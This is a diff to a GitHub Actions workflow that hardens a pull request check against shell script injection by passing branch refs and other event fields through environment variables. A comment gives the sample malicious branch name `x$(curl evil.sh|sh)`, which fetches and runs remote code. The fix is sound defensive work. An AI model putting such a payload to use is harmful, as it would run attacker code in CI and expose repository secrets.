@@ -130,15 +130,28 @@ jobs:
           python-version: "3.13"
       # The refs come from the event payload, so a branch the rule does not cover
       # is answered without touching the API at all.
+      #
+      # Every one of them travels through `env:`, and NOTHING below interpolates
+      # a `${{ }}` expression into the script. A branch name is attacker-chosen
+      # data on a fork pull request and git permits `$( )`, backticks and quotes
+      # inside a ref, so an expression pasted into `run:` is substituted into the
+      # shell source *before* bash parses it — a branch called
+      # `x$(curl evil.sh|sh)` would execute in this job on every pull request.
+      # As an environment variable the same name is inert bytes. The offline
+      # suite asserts this block stays expression-free.
       - name: Detect a bot push following a human push
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
         run: |
           python scripts/bot_push_after_human_push_check.py \
-            --repo "${{ github.repository }}" \
-            --pr "${{ github.event.pull_request.number }}" \
-            --head-ref "${{ github.event.pull_request.head.ref }}" \
-            --base-ref "${{ github.event.pull_request.base.ref }}"
+            --repo "$REPO" \
+            --pr "$PR_NUMBER" \
+            --head-ref "$HEAD_REF" \
+            --base-ref "$BASE_REF"
 
   coverage:
     name: Coverage gate
